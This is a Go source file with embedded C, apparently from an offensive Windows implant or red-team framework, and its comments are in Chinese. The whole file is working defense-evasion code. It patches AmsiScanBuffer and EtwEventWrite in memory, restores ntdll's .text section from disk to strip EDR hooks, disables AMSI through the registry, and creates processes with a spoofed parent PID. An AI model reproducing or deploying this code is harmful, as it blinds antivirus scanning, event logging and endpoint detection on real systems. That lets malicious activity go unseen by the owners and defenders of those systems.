//go:build windows && amd64 && cgo

package evasion

/*
#cgo CFLAGS: -O2
#include <windows.h>

// patch_amsi 定位并 patch AmsiScanBuffer，使其始终返回 E_INVALIDARG。
// AmsiScanBuffer 通过输出参数 amsiResult 返回扫描结果，而非返回值。
// 返回 E_INVALIDARG (0x80070057) 让 AMSI 框架认为扫描失败并放行内容。
// 这在 Windows 10 2H2+ 版本比 S_OK (xor eax,eax) 更可靠。
int patch_amsi() {
    HMODULE hMod = LoadLibraryA("amsi.dll");
    if (!hMod) return -1;

    FARPROC pFunc = GetProcAddress(hMod, "AmsiScanBuffer");
    if (!pFunc) return -2;

    // Patch: mov eax, 0x80070057 (E_INVALIDARG); ret
    unsigned char patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};

    DWORD oldProtect;
    if (!VirtualProtect(pFunc, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
        return -3;

    memcpy(pFunc, patch, sizeof(patch));

    VirtualProtect(pFunc, sizeof(patch), oldProtect, &oldProtect);
    return 0;
}

// patch_etw 定位并 patch EtwEventWrite，使其不记录事件。
int patch_etw() {
    HMODULE hMod = GetModuleHandleA("ntdll.dll");
    if (!hMod) return -1;

    FARPROC pFunc = GetProcAddress(hMod, "EtwEventWrite");
    if (!pFunc) return -2;

    // Patch: xor eax, eax; ret; nop; nop — 让函数始终返回成功
    // NOP 填充防止覆盖后续指令（与 dotnet_windows.go 一致）
    unsigned char patch[] = {0x31, 0xC0, 0xC3, 0x90, 0x90};

    DWORD oldProtect;
    if (!VirtualProtect(pFunc, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
        return -3;

    memcpy(pFunc, patch, sizeof(patch));

    VirtualProtect(pFunc, sizeof(patch), oldProtect, &oldProtect);
    return 0;
}

// refresh_pe 从磁盘重新加载 ntdll.dll 的 .text 节，清除 EDR hooks。
int refresh_pe() {
    // 1. 获取内存中 ntdll.dll 基址
    HMODULE hMod = GetModuleHandleA("ntdll.dll");
    if (!hMod) return -1;

    // 2. 打开磁盘文件
    HANDLE hFile = CreateFileA(
        "C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return -2;

    // 3. 获取文件大小
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        return -3;
    }

    // 4. 映射文件
    HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMapping) {
        CloseHandle(hFile);
        return -4;
    }

    unsigned char* fileBase = (unsigned char*)MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!fileBase) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return -5;
    }

    // 5. 解析 PE 头部
    if (fileBase[0] != 'M' || fileBase[1] != 'Z') {
        UnmapViewOfFile(fileBase);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return -6;
    }

    int e_lfanew = *(int*)(fileBase + 0x3C);
    if (fileBase[e_lfanew] != 'P' || fileBase[e_lfanew+1] != 'E') {
        UnmapViewOfFile(fileBase);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return -7;
    }

    unsigned short sections = *(unsigned short*)(fileBase + e_lfanew + 6);
    unsigned short sizeOfOpt = *(unsigned short*)(fileBase + e_lfanew + 20);
    unsigned char* sectionsPtr = fileBase + e_lfanew + 24 + sizeOfOpt;

    // 6. 找到 .text 节并覆盖
    for (int i = 0; i < sections; i++) {
        unsigned char* sec = sectionsPtr + (i * 40);
        if (sec[0] == '.' && sec[1] == 't' && sec[2] == 'e' && sec[3] == 'x' && sec[4] == 't') {
            unsigned int rva = *(unsigned int*)(sec + 12);
            unsigned int rawOffset = *(unsigned int*)(sec + 20);
            unsigned int vsize = *(unsigned int*)(sec + 8);

            // Clamp vsize to avoid reading past the mapped file region
            if (rawOffset + vsize > fileSize) vsize = fileSize - rawOffset;

            unsigned char* memText = (unsigned char*)hMod + rva;
            unsigned char* fileText = fileBase + rawOffset;

            DWORD oldProtect;
            if (!VirtualProtect(memText, vsize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                UnmapViewOfFile(fileBase);
                CloseHandle(hMapping);
                CloseHandle(hFile);
                return -8;
            }

            memcpy(memText, fileText, vsize);

            VirtualProtect(memText, vsize, oldProtect, &oldProtect);
            break;
        }
    }

    UnmapViewOfFile(fileBase);
    CloseHandle(hMapping);
    CloseHandle(hFile);
    return 0;
}
*/
import "C"

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// AMSIBypassMemoryPatch 通过内存 patch 绕过 AMSI。
func AMSIBypassMemoryPatch() error {
	ret := C.patch_amsi()
	if ret != 0 {
		return fmt.Errorf("amsi patch failed: code=%d", int(ret))
	}
	return nil
}

// ETWBypassMemoryPatch patch EtwEventWrite 使其不记录事件。
func ETWBypassMemoryPatch() error {
	ret := C.patch_etw()
	if ret != 0 {
		return fmt.Errorf("etw patch failed: code=%d", int(ret))
	}
	return nil
}

// RefreshPE 从磁盘重新加载 ntdll.dll 的 .text 节，清除 EDR hooks。
func RefreshPE() error {
	ret := C.refresh_pe()
	if ret != 0 {
		return fmt.Errorf("refresh pe failed: code=%d", int(ret))
	}
	return nil
}

// AMSIBypassRegistry 修改注册表禁用 AMSI。
func AMSIBypassRegistry() error {
	// 通过修改 HKLM\SOFTWARE\Microsoft\AMSI\ProviderEnabled=0 禁用 AMSI
	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	procRegOpenKey := advapi32.NewProc("RegOpenKeyExW")
	procRegSetValue := advapi32.NewProc("RegSetValueExW")
	procRegCloseKey := advapi32.NewProc("RegCloseKey")

	keyPath, _ := syscall.UTF16PtrFromString(`SOFTWARE\Microsoft\AMSI`)
	var hKey syscall.Handle
	r, _, _ := procRegOpenKey.Call(
		uintptr(syscall.HKEY_LOCAL_MACHINE),
		uintptr(unsafe.Pointer(keyPath)),
		0,
		uintptr(0x00020000), // KEY_SET_VALUE
		uintptr(unsafe.Pointer(&hKey)),
	)
	if r != 0 {
		return fmt.Errorf("RegOpenKeyEx: failed (HKLM may require admin)")
	}
	defer procRegCloseKey.Call(uintptr(hKey))

	valName, _ := syscall.UTF16PtrFromString("ProviderEnabled")
	val := uint32(0)
	r, _, _ = procRegSetValue.Call(
		uintptr(hKey),
		uintptr(unsafe.Pointer(valName)),
		uintptr(0), // Reserved — must be zero for RegSetValueExW
		uintptr(windows.REG_DWORD),
		uintptr(unsafe.Pointer(&val)),
		uintptr(4),
	)
	if r != 0 {
		return fmt.Errorf("RegSetValueEx: failed")
	}
	return nil
}

// PPIDSpoofConfig 是 PPID 欺骗的配置。
type PPIDSpoofConfig struct {
	ParentPID     uint32
	InheritHandle bool
}

// CreateProcessSpoof 使用指定的父进程创建新进程。
func CreateProcessSpoof(cmdLine string, config PPIDSpoofConfig) error {
	if config.ParentPID == 0 {
		return fmt.Errorf("parent PID is required")
	}

	// 1. 打开父进程
	hParent, err := windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, config.ParentPID)
	if err != nil {
		return fmt.Errorf("OpenProcess(%d): %w", config.ParentPID, err)
	}
	defer windows.CloseHandle(hParent)

	// 2. 准备命令行
	cmdPtr, _ := syscall.UTF16FromString(cmdLine)

	// 3. 设置 PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
	// 需要扩展的 STARTUPINFOEX
	type startupInfoEx struct {
		windows.StartupInfo
		lpAttributeList uintptr
	}
	siEx := &startupInfoEx{}
	siEx.Cb = uint32(unsafe.Sizeof(startupInfoEx{}))

	var size uintptr
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procInitAttrList := kernel32.NewProc("InitializeProcThreadAttributeList")
	procUpdateAttr := kernel32.NewProc("UpdateProcThreadAttribute")
	procDeleteAttrList := kernel32.NewProc("DeleteProcThreadAttributeList")

	// 第一次调用获取所需大小
	procInitAttrList.Call(0, 1, 0, uintptr(unsafe.Pointer(&size)), 0, 0, 0)

	// 分配属性列表
	attrList := make([]byte, size)
	siEx.lpAttributeList = uintptr(unsafe.Pointer(&attrList[0]))

	// 初始化属性列表 — check return value
	r1, _, _ := procInitAttrList.Call(siEx.lpAttributeList, 1, 0, uintptr(unsafe.Pointer(&size)), 0, 0, 0)
	if r1 == 0 {
		return fmt.Errorf("InitializeProcThreadAttributeList failed")
	}

	// 设置父进程属性
	procUpdateAttr.Call(
		siEx.lpAttributeList,
		0x00020000, // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
		uintptr(unsafe.Pointer(&hParent)),
		uintptr(unsafe.Sizeof(hParent)),
		0, 0, 0,
	)

	var pi windows.ProcessInformation
	createProc := kernel32.NewProc("CreateProcessW")
	r, _, err := createProc.Call(
		0,
		uintptr(unsafe.Pointer(&cmdPtr[0])),
		0, 0,
		1, // bInheritHandles (TRUE, required for PPID spoofing)
		0x00080000, // EXTENDED_STARTUPINFO_PRESENT
		0, 0,
		uintptr(unsafe.Pointer(siEx)),
		uintptr(unsafe.Pointer(&pi)),
	)
	// Always clean up attribute list
	procDeleteAttrList.Call(siEx.lpAttributeList)

	if r == 0 {
		return fmt.Errorf("CreateProcess: %w", err)
	}

	windows.CloseHandle(pi.Thread)
	windows.CloseHandle(pi.Process)
	return nil
}
